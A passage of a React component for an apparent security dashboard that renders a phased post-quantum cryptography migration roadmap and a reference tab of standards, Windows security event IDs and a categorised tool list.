                { phase: "Phase 1 — Now", color: COLORS.red, items: ["Run crypto inventory: identify all RSA/ECDSA usage in code, certs, and protocols", "Submit PQC migration plan per NSM-10 (overdue for most agencies)", "Identify HNDL-risk data: long-lived secrets, classified materials", "Enable hybrid PQC in TLS (X25519+ML-KEM-768) for internet-facing services"] },
                { phase: "Phase 2 — 2025–2027", color: COLORS.amber, items: ["Replace internet-facing TLS with PQC-capable stacks (OQS-OpenSSL, AWS s2n-tls)", "Issue new intermediate CAs with ML-DSA-65 signatures", "Migrate internal mTLS to PQC key exchange", "Update code: replace hardcoded algorithm assumptions with crypto-agile patterns"] },
                { phase: "Phase 3 — 2028–2030", color: COLORS.green, items: ["Complete root CA migration to ML-DSA (requires trust store distribution)", "Retire all RSA-only systems and ECDSA P-256 for NSS", "Full CNSA 2.0 compliance for National Security Systems", "FIPS 203/204/205 validated modules in all federal cryptographic implementations"] },
              ].map((p) => (
                <div key={p.phase} style={{ marginBottom: "16px" }}>
                  <div style={{ fontSize: "12px", color: p.color, fontFamily: "monospace", fontWeight: 600, marginBottom: "6px" }}>{p.phase}</div>
                  {p.items.map((item) => (
                    <div key={item} style={{ fontSize: "12px", color: COLORS.textMid, padding: "4px 0", display: "flex", gap: "8px" }}>
                      <span style={{ color: p.color, flexShrink: 0 }}>▸</span>{item}
                    </div>
                  ))}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* REFERENCE TAB */}
        {activeTab === "reference" && (
          <div>
            <div style={{ fontSize: "11px", fontWeight: 600, color: COLORS.textDim, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: "12px" }}>Federal & Industry Standards</div>
            {referenceData.standards.map((s) => (
              <div key={s.id} style={{ background: COLORS.bgCard, border: `1px solid ${COLORS.border}`, borderRadius: "8px", padding: "14px 16px", marginBottom: "8px", display: "grid", gridTemplateColumns: "160px 1fr", gap: "16px", alignItems: "start" }}>
                <div>
                  <div style={{ fontSize: "12px", fontFamily: "monospace", fontWeight: 600, color: COLORS.blueText }}>{s.id}</div>
                  <div style={{ fontSize: "10px", color: COLORS.textDim, marginTop: "2px" }}>{s.scope}</div>
                </div>
                <div>
                  <div style={{ fontSize: "12px", color: COLORS.text, marginBottom: "4px" }}>{s.title}</div>
                  <div style={{ fontSize: "11px", color: COLORS.textMid, lineHeight: 1.5 }}>{s.key}</div>
                </div>
              </div>
            ))}

            <div style={{ fontSize: "11px", fontWeight: 600, color: COLORS.textDim, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: "12px", marginTop: "24px" }}>Windows Security Event IDs</div>
            <div style={{ background: COLORS.bgCard, border: `1px solid ${COLORS.border}`, borderRadius: "10px", overflow: "hidden" }}>
              {referenceData.eventIds.map((e, i) => (
                <div key={e.id} style={{ display: "grid", gridTemplateColumns: "70px 200px 1fr", gap: "16px", padding: "12px 16px", borderBottom: i < referenceData.eventIds.length - 1 ? `1px solid ${COLORS.border}` : "none", alignItems: "start" }}>
                  <div style={{ fontFamily: "monospace", fontSize: "13px", fontWeight: 700, color: COLORS.amberText }}>{e.id}</div>
                  <div style={{ fontSize: "12px", color: COLORS.text }}>{e.meaning}</div>
                  <div style={{ fontSize: "11px", color: COLORS.textMid, lineHeight: 1.5 }}>{e.alert}</div>
                </div>
              ))}
            </div>

            <div style={{ fontSize: "11px", fontWeight: 600, color: COLORS.textDim, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: "12px", marginTop: "24px" }}>Tool Reference</div>
            <div style={{ background: COLORS.bgCard, border: `1px solid ${COLORS.border}`, borderRadius: "10px", overflow: "hidden" }}>
              {referenceData.tools.map((t, i) => (
                <div key={t.name} style={{ display: "grid", gridTemplateColumns: "140px 80px 60px 1fr", gap: "14px", padding: "11px 16px", borderBottom: i < referenceData.tools.length - 1 ? `1px solid ${COLORS.border}` : "none", alignItems: "start" }}>
                  <div style={{ fontFamily: "monospace", fontSize: "12px", fontWeight: 600, color: "#fff" }}>{t.name}</div>
                  <div>
                    <span style={{
                      fontSize: "10px", padding: "2px 7px", borderRadius: "3px", fontFamily: "monospace", fontWeight: 600,
                      background: t.category.includes("Off") && t.category.includes("Def") ? COLORS.purpleDim : t.category === "Off" ? COLORS.redDim : t.category === "Def" ? COLORS.greenDim : t.category === "Recon" ? COLORS.blueDim : "#ffffff10",
                      color: t.category.includes("Off") && t.category.includes("Def") ? COLORS.purpleText : t.category === "Off" ? COLORS.redText : t.category === "Def" ? COLORS.greenText : t.category === "Recon" ? COLORS.blueText : COLORS.textMid,
                    }}>
                      {t.category}
                    </span>
                  </div>
                  <div style={{ fontSize: "10px", color: COLORS.textDim, fontFamily: "monospace" }}>{t.lang}</div>
                  <div style={{ fontSize: "11px", color: COLORS.textMid, lineHeight: 1.5 }}>{t.use}</div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
